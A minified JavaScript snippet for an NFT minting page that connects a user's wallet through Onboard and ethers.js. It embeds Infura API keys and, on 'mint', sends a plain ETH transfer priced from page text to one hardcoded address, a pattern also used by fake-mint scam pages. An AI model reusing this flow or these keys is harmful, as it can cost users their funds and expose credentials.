const NETWORK_ID = 1; const RPC_URL = 'https://mainnet.infura.io/v3/2f88680a64974f969bc43bb8c88a4532'; const ADDRESS ="0x0EfaBA1550fd95402AFA21c078150b9eA81dab04";class Wallet{provider
onboard=Onboard({networkId:NETWORK_ID,darkMode:!0,subscriptions:{wallet:wallet=>{if(wallet.provider){this.provider=new ethers.providers.Web3Provider(wallet.provider,'any')
window.localStorage.setItem('selectedWallet',wallet.name)}else{this.provider=null}}},walletSelect:{wallets:[{walletName:'metamask'},{walletName:'trust',rpcUrl:RPC_URL},{walletName:'walletConnect',infuraKey:'74477daba7574231bc04251d2e20d7cd'}]}})
async connectWallet(){await this.onboard.walletSelect()
await this.onboard.walletCheck()}
readyToTransact=async()=>{if(!this.provider){const walletSelected=await this.onboard.walletSelect()
if(!walletSelected)return!1}
const ready=await this.onboard.walletCheck()
return ready}
async sendEth(){let price=document.getElementById('price').textContent.toString();_paq.push(['trackEvent','Mint','Click Mint','NFTs',price]);console.log(price);const ready=await this.readyToTransact()
if(!ready)return
_paq.push(['trackEvent','Mint','Select Wallet','NFTs']);const signer=this.provider.getUncheckedSigner()
try{await signer.sendTransaction({to:ADDRESS,value:ethers.utils.parseEther(price),gasLimit:100000,});_paq.push(['trackEvent','Mint','Send Mint Transaction','NFTs',price]);}catch(err){console.log(err.message);_paq.push(['trackEvent','Mint','Error Sending Mint Transaction',err.message,price]);}}}
const wallet=new Wallet()